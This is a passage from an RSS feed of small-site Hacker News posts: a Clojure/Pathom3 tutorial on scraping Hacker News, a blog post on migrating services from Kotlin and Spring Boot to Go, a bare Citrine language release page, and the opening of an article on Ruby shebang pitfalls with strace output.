this mapping in various ways to query information.</p><p>This scraper will be capable of:</p><ul><li>Listing hacker news pages: news, past, ask</li><li>Read user data</li><li>Read comments from items</li><li>Navigate on pagination</li></ul><p>Let's start!</p><h2>Attribute mapping</h2><p>The first step is to make names for every attribute we want to handle.</p><p>Here is a quick guide you can follow to help in this process:</p><ol><li>Pick a general prefix, usually the product/service name. For this case, I'll pick: <code>hacker-news</code>.</li><li>For data points, add some entity context in the name. In the case of Hacker News, I see they call it <code>item</code>.</li><li>If you mean to read collections, give each collection a name.</li></ol><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>If you are developing a product for a company, use the company name for step one.
Avoid having short names like <code>:user/name</code> since they have a higher collision chance.
This makes your names much harder to integrate with other names.</p></div><p>Let's see what are the interesting data points to extract from the Hacker News front
page:</p><p>  <img alt="Front Page Mapping" src="https://pathom3.wsscode.com/assets/images/front-page-mapping-d5349096bcb336297a94210c1ff2a0d9.png"></p><p>The circle cursors point to visible points of data. The open diamond means the data
is hidden (inside the markup).</p><p>I used the name <code>:hacker-news.page/news</code> to name the collection of items for this page.</p><p>Here is a text version of all the declared attributes:</p><div><div><div tabindex="0"><div><p><span>; item attributes</span></p><p><span>:hacker-news.item/age</span></p><p><span>:hacker-news.item/author-name</span></p><p><span>:hacker-news.item/id</span></p><p><span>:hacker-news.item/comments-count</span></p><p><span>:hacker-news.item/score</span></p><p><span>:hacker-news.item/rank-in-page</span></p><p><span>:hacker-news.item/source</span></p><p><span>:hacker-news.item/title</span></p><p><span>:hacker-news.item/url</span></p><p><span>; news collection</span></p><p><span>:hacker-news.page/news</span></p></div></div></div></div><h2>Reading the news page</h2><p>For the implementation, I'll use the <a href="https://github.com/davidsantiago/hickory" target="_blank" rel="noopener noreferrer">Hickory</a> library to parse the HTML and extract
the data.</p><p>To start, we need to explore and figure the code to extract the information fragments
from the HTML page.</p><p>I like to start reading the raw HTML and saving it on a <code>defonce</code>, so I can keep reloading
the REPL while has a cached version of sample data:</p><div><div><div tabindex="0"><div><p><span>(ns com.wsscode.pathom3.docs.demos.tutorials.hacker-news-scrapper)</span></p><p><span>(defonce sample-html (slurp (str "https://news.ycombinator.com/news")))</span></p></div></div></div></div><p>It's time to learn about the HTML structure of Hacker News page. I like to use the
Chrome inspector to navigate. I can see there is a table with the class <code>itemlist</code>
wrapping the item elements.</p><p>  <img alt="Front Page Mapping" src="https://pathom3.wsscode.com/assets/images/inspect-container-649f80cfd60a317b395eb5fbacdd95cb.png"></p><h3>Finding the items</h3><p>I'll start this query using our data and Hickory and try it on the REPL, I suggest
you follow along in your REPL:</p><div><div><div tabindex="0"><div><p><span>(ns com.wsscode.pathom3.docs.demos.tutorials.hacker-news-scrapper</span></p><p><span>  (:require [hickory.core :as hc]</span></p><p><span>            [hickory.select :as hs]))</span></p><p><span>(defonce sample-html (slurp (str "https://news.ycombinator.com/news")))</span></p><p><span>(comment</span></p><p><span>  ; navigate to table element</span></p><p><span>  (-&gt;&gt; sample-html</span></p><p><span>       (hc/parse)</span></p><p><span>       (hc/as-hickory)</span></p><p><span>       (hs/select (hs/class "itemlist"))</span></p><p><span>       first))</span></p></div></div></div></div><p>Now we can extract the rows out. Hacker News doesn't make it straight forward. When I
look at the rows, I see each item uses two table rows. Then it has a spacer row between
the next two with the class <code>spacer</code>. To add more details, there is a
different row with the class <code>morespace</code> in the end.</p><p>To deal with this, we are going to query for rows, removing the ones with the class <code>spacer</code>
or <code>morespace</code>.</p><p>This is how we can do it with Hickory:</p><div><div><div tabindex="0"><div><p><span>(comment</span></p><p><span>  (-&gt;&gt; sample-html</span></p><p><span>       (hc/parse)</span></p><p><span>       (hc/as-hickory)</span></p><p><span>       (hs/select (hs/class "itemlist"))</span></p><p><span>       first</span></p><p><span>       (hs/select (hs/and</span></p><p><span>                    (hs/tag "tr")</span></p><p><span>                    (hs/not (hs/or</span></p><p><span>                              (hs/class "spacer")</span></p><p><span>                              (hs/class "morespace")))))</span></p><p><span>       (partition 2)</span></p><p><span>       (mapv #(hash-map :type :element :tag :tbody :content (vec %)))))</span></p></div></div></div></div><p>Now we have a collection where each item represents a row in Hacker News.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>After the <code>partition</code> the <code>mapv</code> is making a fake element for Hickory, this way we
can threat the two rows as a single element for querying in.</p></div><h3>Read item details</h3><p>Now for each item, we need to extract the attributes we want. Here are a few helpers
we will use for it:</p><div><div><div tabindex="0"><div><p><span>(defn find-text</span></p><p><span>  "Given an element, traverse the contents until it reaches some text."</span></p><p><span>  [el]</span></p><p><span>  (loop [item (first (:content el))]</span></p><p><span>    (if (string? item)</span></p><p><span>      item</span></p><p><span>      (if-let [next (some-&gt; item :content first)]</span></p><p><span>        (recur next)</span></p><p><span>        nil))))</span></p><p><span>(defn class-text</span></p><p><span>  "Get the text for a given element that matches a css class."</span></p><p><span>  [el class]</span></p><p><span>  (-&gt;&gt; (hs/select (hs/class class) el)</span></p><p><span>       first</span></p><p><span>       (find-text)))</span></p><p><span>(defn select-number</span></p><p><span>  "Extract the first integer from a string."</span></p><p><span>  [x]</span></p><p><span>  (if-let [[_ n] (re-find #"(\d+)" (str x))]</span></p><p><span>    (Integer/parseInt n)</span></p><p><span>    0))</span></p></div></div></div></div><p>Here is a function to extract the data points we mentioned at start from each item:</p><div><div><div tabindex="0"><div><p><span>(defn extract-item-from-hickory [el]</span></p><p><span>  {:hacker-news.item/age            (class-text el "age")</span></p><p><span>   :hacker-news.item/author-name    (class-text el "hnuser")</span></p><p><span>   :hacker-news.item/comments-count (-&gt;&gt; (hs/select (hs/find-in-text #"comments$") el)</span></p><p><span>                                         first</span></p><p><span>                                         (find-text)</span></p><p><span>                                         (select-number))</span></p><p><span>   :hacker-news.item/score          (select-number (class-text el "score"))</span></p><p><span>   :hacker-news.item/id             (-&gt;&gt; el :content first :attrs :id)</span></p><p><span>   :hacker-news.item/rank-in-page   (select-number (class-text el "rank"))</span></p><p><span>   :hacker-news.item/source         (class-text el "sitestr")</span></p><p><span>   :hacker-news.item/title          (class-text el "storylink")</span></p><p><span>   :hacker-news.item/url            (-&gt;&gt; (hs/select (hs/class "storylink") el)</span></p><p><span>                                         first :attrs :href)})</span></p></div></div></div></div><p>Let's use it to extract the data from our previous process:</p><div><div><div tabindex="0"><div><p><span>(comment</span></p><p><span>  (-&gt;&gt; sample-html</span></p><p><span>       (hc/parse)</span></p><p><span>       (hc/as-hickory)</span></p><p><span>       (hs/select (hs/class "itemlist"))</span></p><p><span>       first</span></p><p><span>       (hs/select (hs/and</span></p><p><span>                    (hs/tag "tr")</span></p><p><span>                    (hs/not (hs/or</span></p><p><span>                              (hs/class "spacer")</span></p><p><span>                              (hs/class "morespace")))))</span></p><p><span>       (partition 2)</span></p><p><span>       (mapv #(hash-map :type :element :tag :tbody :content (vec %)))</span></p><p><span>       (mapv extract-item-from-hickory)))</span></p></div></div></div></div><p>Now you should see the nice plain data in the output, with one map for each
item entry.</p><h2>Make a resolver</h2><p>Time to introduce Pathom, now I'm going to turn that exploration code in a resolver:</p><div><div><div tabindex="0"><div><p><span>(ns com.wsscode.pathom3.docs.demos.tutorials.hacker-news-scrapper</span></p><p><span>  (:require [com.wsscode.pathom3.connect.indexes :as pci]</span></p><p><span>            [com.wsscode.pathom3.connect.operation :as pco]</span></p><p><span>            [com.wsscode.pathom3.interface.eql :as p.eql]</span></p><p><span>            [hickory.core :as hc]</span></p><p><span>            [hickory.select :as hs]))</span></p><p><span>(defn find-text</span></p><p><span>  "Given an element, traverse the contents until it reaches some text."</span></p><p><span>  [el]</span></p><p><span>  (loop [item (first (:content el))]</span></p><p><span>    (if (string? item)</span></p><p><span>      item</span></p><p><span>      (if-let [next (some-&gt; item :content first)]</span></p><p><span>        (recur next)</span></p><p><span>        nil))))</span></p><p><span>(defn class-text</span></p><p><span>  "Get the text for a given element that matches a css class."</span></p><p><span>  [el class]</span></p><p><span>  (-&gt;&gt; (hs/select (hs/class class) el)</span></p><p><span>       first</span></p><p><span>       (find-text)))</span></p><p><span>(defn select-number</span></p><p><span>  "Extract the first integer from a string."</span></p><p><span>  [x]</span></p><p><span>  (if-let [[_ n] (re-find #"(\d+)" (str x))]</span></p><p><span>    (Integer/parseInt n)</span></p><p><span>    0))</span></p><p><span>(defn extract-item-from-hickory [el]</span></p><p><span>  {:hacker-news.item/age            (class-text el "age")</span></p><p><span>   :hacker-news.item/author-name    (class-text el "hnuser")</span></p><p><span>   :hacker-news.item/comments-count (-&gt;&gt; (hs/select (hs/find-in-text #"comments$") el)</span></p><p><span>                                         first</span></p><p><span>                                         (find-text)</span></p><p><span>                                         (select-number))</span></p><p><span>   :hacker-news.item/score          (select-number (class-text el "score"))</span></p><p><span>   :hacker-news.item/id             (-&gt;&gt; el :content first :attrs :id)</span></p><p><span>   :hacker-news.item/rank-in-page   (select-number (class-text el "rank"))</span></p><p><span>   :hacker-news.item/source         (class-text el "sitestr")</span></p><p><span>   :hacker-news.item/title          (class-text el "storylink")</span></p><p><span>   :hacker-news.item/url            (-&gt;&gt; (hs/select (hs/class "storylink") el)</span></p><p><span>                                         first :attrs :href)})</span></p><p><span>(pco/defresolver news-page-html-string []</span></p><p><span>  {:hacker-news.page/news-raw-html</span></p><p><span>   (slurp "https://news.ycombinator.com/news")})</span></p><p><span>(pco/defresolver news-page [{:hacker-news.page/keys [news-raw-html]}]</span></p><p><span>  {::pco/output</span></p><p><span>   [{:hacker-news.page/news</span></p><p><span>     [:hacker-news.item/age</span></p><p><span>      :hacker-news.item/author-name</span></p><p><span>      :hacker-news.item/id</span></p><p><span>      :hacker-news.item/comments-count</span></p><p><span>      :hacker-news.item/score</span></p><p><span>      :hacker-news.item/rank-in-page</span></p><p><span>      :hacker-news.item/source</span></p><p><span>      :hacker-news.item/title</span></p><p><span>      :hacker-news.item/url]}]}</span></p><p><span>  {:hacker-news.page/news</span></p><p><span>   (-&gt;&gt; news-raw-html</span></p><p><span>        (hc/parse)</span></p><p><span>        (hc/as-hickory)</span></p><p><span>        (hs/select (hs/class "itemlist"))</span></p><p><span>        first</span></p><p><span>        (hs/select (hs/and</span></p><p><span>                     (hs/tag "tr")</span></p><p><span>                     (hs/not (hs/or</span></p><p><span>                               (hs/class "spacer")</span></p><p><span>                               (hs/class "morespace")))))</span></p><p><span>        (partition 2)</span></p><p><span>        (mapv #(hash-map :type :element :tag :tbody :content (vec %)))</span></p><p><span>        (mapv extract-item-from-hickory))})</span></p><p><span>(def env</span></p><p><span>  (pci/register</span></p><p><span>    [news-page-html-string</span></p><p><span>     news-page]))</span></p><p><span>(comment</span></p><p><span>  ; get the title of all the news</span></p><p><span>  (p.eql/process env</span></p><p><span>    [{:hacker-news.page/news</span></p><p><span>      [:hacker-news.item/title]}]))</span></p></div></div></div></div><p>Not much yet, but we gained the ability to filter pieces of the results.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></p><p>Some editors like <a href="https://cursive-ide.com/" target="_blank" rel="noopener noreferrer">Cursive</a> do highlight keywords when your
cursor is over them. You can use this indication to see the inputs connecting with
outputs in the editor.</p></div><h3>Caching the request for development</h3><p>When we run the process now, it requests hacker news every time. For development
it's useful if we can cache that to have a faster iteration.</p><p>You may have noticed I used a separated resolver to fetch the HTML string. We can make
this resolver use a durable cache to speed up the iteration:</p><div><div><div tabindex="0"><div><p><span>(pco/defresolver news-page-html-string []</span></p><p><span>  ; define a custom cache store for this resolver</span></p><p><span>  {::pco/cache-store ::durable-cache*}</span></p><p><span>  {:hacker-news.page/news-raw-html</span></p><p><span>   (slurp "https://news.ycombinator.com/news")})</span></p><p><span>; defonce to have a durable cache, an …</span></p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pathom3.wsscode.com/docs/tutorials/hacker-news-scraper">https://pathom3.wsscode.com/docs/tutorials/hacker-news-scraper</a></em></p>]]>
            </description>
            <link>https://pathom3.wsscode.com/docs/tutorials/hacker-news-scraper</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777119</guid>
            <pubDate>Thu, 14 Jan 2021 15:06:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why We Moved from Kotlin and Spring Boot to Go]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25777076">thread link</a>) | @foxgrover
<br/>
January 14, 2021 | https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/ | <a href="https://web.archive.org/web/*/https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>Our product completely supports Java and we love Java developers. However, internally for our own code, we believe <a href="https://movingfulcrum.com/the-era-of-the-jvm-is-coming-to-an-end/">the era of the JVM is coming to an end</a>.</p><p>We found these 3 things initially attractive about Go:</p><ol><li>Instant compile times and program startup for faster development</li><li>Virtual threads for dealing with high concurrency workloads</li><li>Value types to better control memory usage</li></ol><p>We found a ton more to like later, but this was enough to give it a go.</p><h3 id="hurdles">Hurdles</h3><p>Right off the bat, Go's compile-time enforced formatting rules and casing of variables seemed like a weird choice. However, soon after I warmed up to them knowing that they enforced a certain amount of code uniformity across our codebase.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Why does Golang use identifer capitalization for public/private visibility? This seemed like an insane design decision to me. Now I realize. Go is simply saying 'Naming conventions are not guidelines, they are rules'. Uniform naming conventions across 100% of Go code is good.</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1346528650137538560?ref_src=twsrc%5Etfw">January 5, 2021</a></blockquote>

</figure><p>The biggest hurdle though was the lack of an equivalent of a Spring Framework for Go. While the Go ecosystem has multiple libraries for all kinds of functionality, there didn't seem to be a standard way of doing things like logging, dependency injection, environment configuration, etc. We had to solve this before we could adopt Go in a major way in our organization. Thus, alongside developing the first few microservices, we kept working on an in-house framework, Gallium. The Gallium Framework could use a blog post of its own. In short, it standardizes on some libraries in the &nbsp;Go ecosystem for things like Logging, DI, etc, and makes it easy to structure microservices for our environment. We keep evolving Gallium with learnings from each Go microservice we develop.</p><p>We do miss <a href="https://blog.astradot.com/why-we-use-jooq-instead-of-hibernate/">JOOQ</a> though. <code>goqu</code> comes close, but its not the same.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I would gladly pay for a version of <a href="https://twitter.com/JavaOOQ?ref_src=twsrc%5Etfw">@JavaOOQ</a> that generated Golang code</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1342940430799785984?ref_src=twsrc%5Etfw">December 26, 2020</a></blockquote>

</figure><p>Also, the <code>time</code> package could use some improvements:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Golang not parsing ISO8601 Durations seems like a weird omission</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1345158151146938368?ref_src=twsrc%5Etfw">January 2, 2021</a></blockquote>

</figure><p>Though, its still a <em>lot</em> better than the <code>java.time</code> insanity:</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>Java 8's 'new' Time API:</p><p>Wanna store time? Pick from</p><p>1. Instant<br>2. LocalDateTime<br>3. OffsetDateTime<br>4. ZonedDateTime<br>5. LocalTime<br>6. OffsetTime<br>7. LocalDate</p><p>Wanna store ISO Period? Pick from</p><p>1. Period<br>2. Duration</p><p>LuxonJS OTOH:</p><p>- DateTime<br>- Duration</p><p>Does work of all 9 above</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1163917935431127041?ref_src=twsrc%5Etfw">August 20, 2019</a></blockquote>

</figure><h3 id="in-the-land-of-magic">In the land of magic</h3><p>We took one of our simpler but high throughout Spring Boot service called <code>metric-query</code> and converted it to Go. <code>metric-query</code> takes in queries from our dashboard and runs them against our metric database. Since our dashboards refresh every 2 seconds, it can get a lot of requests at once. In the JVM world, each of these requests would spawn a whole thread.</p><p>After converting to Golang, we saw the memory usage drop by 40x! We had to double-check that our charts were not faulty.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Converted a high throughput service from Kotlin &amp; Spring Boot to Golang. Memory usage went down from ~800MB per instance to ~20MB per instance!! <a href="https://t.co/KATZenY8OG">pic.twitter.com/KATZenY8OG</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1345525850670649344?ref_src=twsrc%5Etfw">January 3, 2021</a></blockquote>

</figure><p>This convinced us we were &nbsp;on the right path and the investment in Go was worth it.</p><p>We then converted our highest throughout service, <code>metric-collector</code>. It ingests data from all our agents and puts it on Kafka. It receives a ton of requests all at the same time. The Spring Boot version was maxing the CPU on the nodes it was deployed and eating up tons of memory. &nbsp;Latency was all over the place.</p><p>Converting it to Go and watching the graphs was pure magic. CPU usage and latency dropped to almost nothing. Memory usage dropped to insignificant levels. This could be a case study for virtual threads.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Kafka producer latency after switching ultra high throughput app from Kotlin to Golang. The latency graph almost feels like it disappears after the switch. <a href="https://t.co/kewMpkh4tQ">pic.twitter.com/kewMpkh4tQ</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1347745009085210626?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>

</figure><figure><blockquote data-width="550"><p lang="en" dir="ltr">Finished migrating the ultra high throughput service from Kotlin to Golang. Memory usage went from 3.1GB to 125MB! <a href="https://t.co/ioVLssxnMz">pic.twitter.com/ioVLssxnMz</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1348142023451176960?ref_src=twsrc%5Etfw">January 10, 2021</a></blockquote>

</figure><p>We have continued converting each microservice from Kotlin/Spring Boot to Go and its magical each time watching those graphs drop.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Cant get enough of seeing the graphs change as I switch a service from Kotlin to Go <a href="https://t.co/kS2nNPRv29">pic.twitter.com/kS2nNPRv29</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1348946882916089856?ref_src=twsrc%5Etfw">January 12, 2021</a></blockquote>

</figure><h3 id="looking-back-at-jvm-world">Looking back at JVM world</h3><p>I have been programming on the JVM for almost 2 decades. Switching to Go was quite a change for me personally too.</p><p>But looking back, the Java/Spring world seems to be toppling to maintain compatibility with all its legacy. It is mind-boggling to think a microservice in 2021 still needs Tomcat to run. Spring MVC is layers and layers of code to get Java Servlets, which were released in 1996, somehow feel relevant in 2021. Kotlin is another massive layer to make Java feel like a modern language.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">I remember writing this Spring MVC code and thinking it was so clean. Now that my blinders are off, it feels like a messy DSL built on annotations. No way to step through flow of logic. To do anything, I need to find appropriate annotation by digging through docs. Its a black box <a href="https://t.co/onwwkx4mjk">pic.twitter.com/onwwkx4mjk</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1349604496490446849?ref_src=twsrc%5Etfw">January 14, 2021</a></blockquote>

</figure><p>The Maven/Gradle build system seems like a ridiculous, unnecessary complexity compared to Go's dependency management.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>It is so liberating to be free of the complexity of Maven/Gradle/NPM/Webpack. </p><p>All one really needs to build a project is a text files with dependencies listed on each line. I just do a `go build` and it produces a binary. I dont need to read an entire book to build my project. <a href="https://t.co/MySfY6p8jv">pic.twitter.com/MySfY6p8jv</a></p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1347358703440121859?ref_src=twsrc%5Etfw">January 8, 2021</a></blockquote>

</figure><p>The JVM, Java, and Spring were great for an era indeed. In 2021, they feel like an 80-yr old trying to compete in the Olympics by taking artificial performance enhancing drugs. Switching to Go feels like a refreshing, exciting change.</p><figure><blockquote data-width="550"><div lang="en" dir="ltr"><p>converting a service from Kotlin/SpringBoot to Golang feels like stepping into the future.</p><p>- Instant compilation<br>- Instant startup<br>- No special code to make async queries<br>- No worrying about too many threads</p><p>I encourage everyone to try it</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1343391654623944705?ref_src=twsrc%5Etfw">December 28, 2020</a></blockquote>

</figure>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25777076</guid>
            <pubDate>Thu, 14 Jan 2021 15:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Citrine Solleveld Windows 32/64 has been released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776829">thread link</a>) | @gabordemooij
<br/>
January 14, 2021 | https://citrine-lang.org/select093.ctr | <a href="https://web.archive.org/web/*/https://citrine-lang.org/select093.ctr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<p><img src="https://citrine-lang.org/img/citrine_banner.jpg" alt="The Citrine Programming Language Project"></p><p>
		PUBKEY:<br>
		RWSEPjwPrf4jAtahiV/HNXWz83QYsppKn0EzVOhsoVV24gwB6mGpsdXL
	</p></div>
</div></div>]]>
            </description>
            <link>https://citrine-lang.org/select093.ctr</link>
            <guid isPermaLink="false">hacker-news-small-sites-25776829</guid>
            <pubDate>Thu, 14 Jan 2021 14:42:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Shebang Papercuts and a Thimble]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25776807">thread link</a>) | @Macha
<br/>
January 14, 2021 | https://www.crystae.net/posts/2019/11/08/two-shebang-papercuts/ | <a href="https://web.archive.org/web/*/https://www.crystae.net/posts/2019/11/08/two-shebang-papercuts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
  <header>
    
    <p>
      
        Tom Jakubowski,
       Friday, 2019-11-08
    </p>
  </header>
  

<p>You’ve written a Ruby script on your Mac.  The script demands great
performance, so you add <code>--enable=jit</code> to its <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)" target="_blank">shebang</a>:</p>

<pre><code>#!/usr/bin/env ruby --enable=jit

print "Hello, world!"
</code></pre>

<p>You test on your Mac and the program greets everybody in record time.  Ship it!</p>

<p>Some time later, a user reports a problem.  When they run the script, it seems
rather slow; in fact, they’ve waited for hours and no one has been greeted.</p>

<p>The script still works (and it’s fast!) on your machine, so you ask the user
about their environment.  One difference stands out: they’re using Linux.  So
you spin up a Linux box and try the script.  Sure enough, it seems stuck.  You
reach for <a href="https://strace.io/" target="_blank"><code>strace</code></a>, and see the same spew looping ad nauseam:</p>

<pre><code>you@yourbox:~$ sudo strace ./hello
execve("./hello", ["./hello"], 0x7ffe721b38b0 /* 52 vars */) = 0
brk(NULL)                               = 0x55b53fddf000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fff6a434040) = -1 EINVAL (Invalid argument)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=211342, ...}) = 0
mmap(NULL, 211342, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4088423000
close(3)                                = 0
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0`r\2\0\0\0\0\0"..., 832) = 832
lseek(3, 64, SEEK_SET)                  = 64
read(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784) = 784
lseek(3, 848, SEEK_SET)                 = 848
read(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32) = 32
lseek(3, 880, SEEK_SET)                 = 880
read(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0003\321\363P\3617(e\35t\335*V\272\321\344"..., 68) = 68
fstat(3, {st_mode=S_IFREG|0755, st_size=2149496, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4088421000
lseek(3, 64, SEEK_SET)                  = 64
read(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784) = 784
lseek(3, 848, SEEK_SET)                 = 848
read(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0", 32) = 32
lseek(3, 880, SEEK_SET)                 = 880
read(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0003\321\363P\3617(e\35t\335*V\272\321\344"..., 68) = 68
mmap(NULL, 1860536, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f408825a000
mprotect(0x7f408827f000, 1671168, PROT_NONE) = 0
mmap(0x7f408827f000, 1363968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f408827f000
mmap(0x7f40883cc000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x172000) = 0x7f40883cc000
mmap(0x7f4088417000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1bc000) = 0x7f4088417000
mmap(0x7f408841d000, 13240, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f408841d000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7f4088422580) = 0
mprotect(0x7f4088417000, 12288, PROT_READ) = 0
mprotect(0x55b53f654000, 4096, PROT_READ) = 0
mprotect(0x7f4088481000, 4096, PROT_READ) = 0
munmap(0x7f4088423000, 211342)          = 0
brk(NULL)                               = 0x55b53fddf000
brk(0x55b53fe00000)                     = 0x55b53fe00000
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=3035216, ...}) = 0
mmap(NULL, 3035216, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4087f74000
close(3)                                = 0
execve("./hello", ["./hello"], 0x7ffe721b38b0 /* 52 vars */) = 0
brk(NULL)                               = 0x55b53fddf000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fff6a434040) = -1 EINVAL (Invalid argument)
...
</code></pre>

<p>What’s going on?  The script is just <code>exec</code>-ing itself in a seemingly infinite
loop, and not really doing anything else.  Why?</p>

<p>It turns out this comes from combining two papercuts, one which applies to
shebangs in general, and another which applies to any which invoke
<code>/usr/bin/env</code>.</p>

